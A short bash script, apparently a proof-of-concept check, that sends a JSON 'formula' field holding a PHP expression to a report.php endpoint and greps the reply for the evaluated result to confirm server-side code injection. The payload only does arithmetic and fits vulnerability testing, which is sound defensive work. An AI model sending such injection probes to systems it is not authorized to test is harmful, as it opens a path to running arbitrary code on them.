#!/usr/bin/env bash
set -eu; . "$(dirname "$0")/_lib.sh"
curl -s -X POST "$TARGET/tools/report.php" -H 'content-type: application/json' -d '{"formula":"\"CODEINJ-PROVEN-\".(6*7)"}' | grep -q 'CODEINJ-PROVEN-42'
